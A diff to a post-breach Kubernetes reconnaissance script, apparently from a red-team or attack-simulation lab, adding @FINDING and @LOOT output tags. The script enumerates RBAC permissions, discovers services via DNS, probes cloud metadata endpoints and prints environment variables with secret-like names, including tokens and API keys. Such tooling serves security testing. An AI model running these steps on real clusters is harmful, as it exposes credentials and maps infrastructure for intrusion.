@@ -22,9 +22,11 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 source "$SCRIPT_DIR/lib.sh"
 
 banner "Post-Breach: Reconnaissance"
+echo "@PHASE Reconnaissance"
 
 PYTHON_CODE="${K8S_API_PREAMBLE}
 
+print('@PHASE SA-Permission-Enumeration')
 print('=' * 60)
 print('  RECON: SA Permission Enumeration')
 print('=' * 60)
@@ -40,6 +42,8 @@ for ns in ['target-apps', 'default', 'kube-system', os.environ.get('NAMESPACE', 
         rules = result.get('status', {}).get('resourceRules', [])
         if rules:
             print(f'  [{ns}] {len(rules)} rules:')
+            print(f'@FINDING info {ns}: {len(rules)} RBAC rules discovered')
+            print(f'@LOOT rbac-rules {ns}:{len(rules)}-rules')
             for r in rules[:10]:
                 verbs = ','.join(r.get('verbs', []))
                 resources = ','.join(r.get('resources', []))
@@ -52,6 +56,7 @@ for ns in ['target-apps', 'default', 'kube-system', os.environ.get('NAMESPACE', 
         print(f'  [{ns}] error: HTTP {status}')
 
 print()
+print('@PHASE DNS-Service-Discovery')
 print('=' * 60)
 print('  RECON: DNS Service Discovery')
 print('=' * 60)
@@ -68,6 +73,8 @@ for svc in services:
             ip = socket.getaddrinfo(fqdn, None)[0][4][0]
             found.append((svc, ns, ip))
             print(f'  FOUND: {svc}.{ns} -> {ip}')
+            print(f'@FINDING medium Service discovered: {svc}.{ns} -> {ip}')
+            print(f'@LOOT service-map {svc}.{ns}={ip}')
         except socket.gaierror:
             pass
 
@@ -75,6 +82,7 @@ if not found:
     print('  No services discovered.')
 
 print()
+print('@PHASE Cloud-Metadata-Probe')
 print('=' * 60)
 print('  RECON: Cloud Metadata Probe')
 print('=' * 60)
@@ -90,22 +98,37 @@ for cloud, host, path in endpoints:
         h = {'Metadata-Flavor': 'Google'} if cloud == 'GCP' else {'Metadata': 'true'} if cloud == 'Azure' else {}
         c.request('GET', path, headers=h)
         r = c.getresponse()
-        print(f'  {cloud}: HTTP {r.status} ({len(r.read())} bytes)')
+        body_len = len(r.read())
+        print(f'  {cloud}: HTTP {r.status} ({body_len} bytes)')
+        if r.status == 200:
+            print(f'@FINDING high {cloud} metadata endpoint reachable — {body_len} bytes')
+            print(f'@LOOT cloud-metadata {cloud}:{body_len}-bytes')
     except Exception as e:
         print(f'  {cloud}: unreachable ({type(e).__name__})')
 
 print()
+print('@PHASE Environment-Variables')
 print('=' * 60)
 print('  RECON: Environment Variables')
 print('=' * 60)
 
 sensitive_keys = ['TOKEN', 'SECRET', 'PASSWORD', 'KEY', 'API', 'CREDENTIAL', 'AUTH', 'ANTHROPIC']
+sensitive_found = []
 for k, v in sorted(os.environ.items()):
-    marker = ' <<<' if any(s in k.upper() for s in sensitive_keys) else ''
+    is_sensitive = any(s in k.upper() for s in sensitive_keys)
+    marker = ' <<<' if is_sensitive else ''
     display_v = v[:80] + '...' if len(v) > 80 else v
     print(f'  {k}={display_v}{marker}')
+    if is_sensitive:
+        sensitive_found.append(k)
+
+if sensitive_found:
+    print(f'@FINDING high {len(sensitive_found)} sensitive env vars found: {",".join(sensitive_found[:5])}')
+    for k in sensitive_found:
+        print(f'@LOOT env-vars {k}')
 
 print()
+print('@RESULT success Reconnaissance complete')
 print('Recon complete.')
 "
 
